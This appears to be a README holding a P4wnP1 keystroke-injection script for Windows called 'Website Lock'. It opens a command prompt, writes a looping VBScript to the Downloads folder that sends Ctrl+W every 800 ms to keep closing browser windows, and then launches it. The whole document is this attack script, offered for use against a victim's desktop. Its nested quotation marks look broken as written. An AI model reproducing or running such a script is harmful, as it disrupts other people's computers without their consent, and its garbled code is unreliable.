# WEBSITE BLOCK
This script has been written in javascript adapted to P4wnP1 language in order to be ran in a Windows desktop environment

# Script
```js
layout('es');                   // Spanish keyboard layout
typingSpeed(100,150)    // Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)

// Title: Website Lock
// Author: Ernest & Isaac
press("ESC")
delay(500)
press("GUI r")
delay(200)
type("cmd")
press("ENTER")
delay(200)
type("cd %userprofile%/Downloads")
press("ENTER")
type("copy con CW.vbs")
press("ENTER")
type("do")
press("ENTER")
type("Set objShell = CreateObject("WScript.Shell")")
press("ENTER")
type("WScript.Sleep 800")
press("ENTER")
type("objShell.SendKeys "^{W}"")
press("ENTER")
type("loop")
delay(100)
press("ENTER")
type("start CW.vbs && exit")
press("ENTER")
```
